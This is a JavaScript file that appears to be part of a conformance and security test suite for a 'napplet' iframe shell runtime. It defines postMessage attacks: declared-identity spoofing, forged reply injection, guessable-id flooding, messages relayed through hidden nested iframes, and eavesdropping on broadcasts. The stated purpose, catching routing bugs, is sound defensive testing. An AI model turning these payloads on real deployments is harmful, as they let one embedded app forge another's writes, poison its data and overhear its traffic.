// evil-03 — transport confusion (tier 1): the postMessage wire itself.
// NIP-5D requires '*' target origin (opaque origins have none) and says the
// ONLY sender identity is MessageEvent.source. These attacks target every
// lazy shortcut around that: trusting declared fields, accepting forged
// replies, routing by guessable ids, accepting unknown sources.
const SEQ_IDS = ['1', '2', '3', '42', 'req-1', 'msg-1', 'nap-1', 'abc123'];

const ATTACKS = [
  {
    id: 'declared-identity',
    name: 'declared-identity spoof',
    target: '"The shell identifies senders via MessageEvent.source (unforgeable)"',
    severity: 'critical',
    harm: 'A runtime that resolves messages by DECLARED identity fields (windowId / dTag / artifactHash in the envelope) instead of the source Window lets any frame become any napplet — cross-napplet privilege forgery.',
    evilBrief: 'Sends storage.set / storage.get envelopes carrying a DECLARED windowId+dTag of a sibling napplet. A runtime that trusts declared fields routes the writes into the sibling\'s namespace — forging writes in another napplet\'s name.',
    async demo() {
      if (!window.napplet) return na('no injected runtime domain — no message router to spoof');
      const id = 'evil03-spoof-' + randId();
      postParent({
        type: 'storage.get', id: id, key: '__evil03_spoof_trap__',
        windowId: 'sibling-frame', dTag: 'evil-01-sandbox-escape', artifactHash: '0000000000000000000000000000000000000000000000000000000000000000',
      });
      const r = await waitForMsg(id, 1600);
      if (r === 'timeout') return blocked('no reply — router did not service the request at all');
      if (r.error) return blocked('routed to MY OWN namespace (reply error: ' + r.error + ') — router binds to MessageEvent.source, declared fields ignored: held');
      return armed('router returned a value from the DECLARED sibling namespace (' + mask(r.value, 20) + ') — envelope identity fields are TRUSTED over MessageEvent.source: any frame can act as any napplet');
    },
    async evil() {
      const out = { sent: 0 };
      for (let i = 0; i < 12; i++) {
        postParent({
          type: 'storage.set', id: 'evil03-forge-set-' + i, key: '__evil03_poison__' + i, value: 'written-as-sibling-' + i,
          windowId: 'sibling-frame', dTag: 'evil-01-sandbox-escape',
        });
        out.sent++;
      }
      out.note = '12 storage.set envelopes dispatched with a DECLARED sibling identity — check the runtime log: a router that trusts declared fields wrote __evil03_poison__* keys into the sibling namespace';
      return out;
    },
  },
  {
    id: 'forged-reply',
    name: 'forged reply injection',
    target: '"Messages with an unrecognized type MUST be silently ignored"',
    severity: 'critical',
    harm: 'A router that accepts *.result envelopes by id (instead of binding the id to the Window that sent the REQUEST) lets an attacker inject replies into pending requests — poison data into a victim napplet\'s awaited call.',
    evilBrief: 'Blasts forged *.result envelopes with garbage ids at the shell — acceptance is the runtime\'s bug; watch the message log for any that get routed.',
    async demo() {
      const id = 'evil03-forged-' + randId();
      postParent({ type: 'relay.query.result', id: id, events: [{ id: 'forged', kind: 1, content: 'evil-03 forged reply' }] });
      return sent('forged result envelope dispatched (type relay.query.result, id=' + id + ') — acceptance is the runtime\'s bug; a conforming router drops it (id never requested). Watch the shell message log');
    },
    async evil() {
      const kinds = ['relay.query.result', 'storage.get.result', 'identity.getPublicKey.result'];
      let sentCount = 0;
      for (let i = 0; i < 15; i++) {
        for (const k of kinds) {
          postParent({ type: k, id: 'forge-' + i, result: { injected: 'evil-03 poison ' + i } });
          sentCount++;
        }
      }
      return { sent: sentCount, note: '45 forged result envelopes dispatched — any routed into pending request ids is a poisoned reply' };
    },
  },
  {
    id: 'sequential-ids',
    name: 'sequential-id injection storm',
    target: 'id correlation across sibling napplets',
    severity: 'high',
    harm: 'SDKs generate guessable request ids (sequential, short). Combined with a router that accepts forged *.result by id, any sibling napplet can resolve another sibling\'s pending requests — cross-napplet confused deputy.',
    evilBrief: 'Blasts forged result envelopes for the most common id patterns (1..42, req-1, msg-1, nap-1, abc123) — whichever pattern your SDK uses, the forged reply lands in a pending sibling request.',
    async demo() {
      for (const sid of SEQ_IDS) {
        postParent({ type: 'storage.get.result', id: sid, value: 'evil-03 poisoned ' + sid });
      }
      return sent(SEQ_IDS.length + ' forged sequential-id results dispatched (' + SEQ_IDS.join(', ') + ') — sibling pending requests are guessable; check the log');
    },
    async evil() {
      let sentCount = 0;
      for (let round = 0; round < 5; round++) {
        for (const sid of SEQ_IDS) {
          postParent({ type: 'relay.query.result', id: sid, events: [{ content: 'evil-03 round-' + round }] });
          postParent({ type: 'storage.get.result', id: sid, value: 'evil-03 round-' + round });
          sentCount += 2;
        }
      }
      return { sent: sentCount, note: 'forged results for common id patterns ×5 rounds dispatched' };
    },
  },
  {
    id: 'unknown-source',
    name: 'unknown-source nested relay',
    target: '"Messages from unknown sources MUST be silently dropped"',
    severity: 'critical',
    harm: 'A frame nested inside the napplet (grandchild) can message the shell if the shell fails the source check — or if the router matches only "any iframe I created" rather than the exact Window. Untrusted relay from unmapped frames.',
    evilBrief: 'Creates nested child frames that postMessage the shell directly as if they were the napplet — a conforming shell drops them (see log); a router that matches loosely routes them.',
    async demo() {
      let child;
      try {
        child = document.createElement('iframe');
        child.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
        child.srcdoc = '<script>window.top.parent.postMessage({type:"storage.get",id:"evil03-nested-' + randId() + '",key:"x"},"*")<\/script>';
        document.body.appendChild(child);
      } catch (e) {
        return blocked('nested frame creation threw: ' + errMsg(e) + ' — unknown-source relay closed');
      }
      await new Promise((res) => setTimeout(res, 700));
      const note = 'nested unmapped frame created (srcdoc children are NOT blocked by frame-src) and messaged the shell directly — a conforming shell DROPS it (MessageEvent.source is not a mapped Window). Check the log for DROPPED; any routed envelope is a source-check bug.';
      try { child.remove(); } catch (_) {}
      return sent(note);
    },
    async evil() {
      const created = [];
      for (let i = 0; i < 3; i++) {
        try {
          const child = document.createElement('iframe');
          child.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
          child.srcdoc = '<script>window.top.parent.postMessage({type:"storage.set",id:"evil03-nested-' + i + '",key:"__evil03_nested__' + i + '",value:"from-unmapped-frame"},"*")<\/script>';
          document.body.appendChild(child);
          created.push(i);
        } catch (e) { /* frame-src holds: the channel stays closed */ }
      }
      return { frames: created.length, note: created.length + ' unmapped nested frames messaged the shell — routed = shell source-check bug' };
    },
  },
  {
    id: 'shell-broadcast',
    name: 'shell broadcast harvest',
    target: 'shell→napplet fan-out messages',
    severity: 'high',
    harm: 'If the shell broadcasts (events, theme, state) to all frames, every sibling hears traffic meant for one — traffic-analysis + forged-target opportunities. Demo: measure what arrives unrequested.',
    evilBrief: 'Listens for shell→napplet broadcast traffic for a few seconds and logs every unsolicited envelope type it receives — evidence of what a sibling napplet can overhear.',
    async demo() {
      const heard = [];
      const on = (e) => {
        const d = e.data;
        if (d && typeof d.type === 'string' && !String(d.id || '').startsWith('evil')) {
          if (!heard.includes(d.type)) heard.push(d.type);
        }
      };
      window.addEventListener('message', on);
      await new Promise((res) => setTimeout(res, 2500));
      window.removeEventListener('message', on);
      return heard.length
        ? sent('overheard ' + heard.length + ' unsolicited envelope type(s) addressed to other frames: ' + heard.join(', ') + ' — broadcast traffic reaches all siblings')
        : na('no unsolicited shell→napplet traffic overheard (no fan-out channel, or quiet shell)');
    },
    async evil() {
      const heard = [];
      const on = (e) => { const d = e.data; if (d && typeof d.type === 'string') heard.push(d.type); };
      window.addEventListener('message', on);
      await new Promise((res) => setTimeout(res, 4000));
      window.removeEventListener('message', on);
      return { overheard: heard, note: '4s harvest of all envelopes reaching this frame' };
    },
  },
];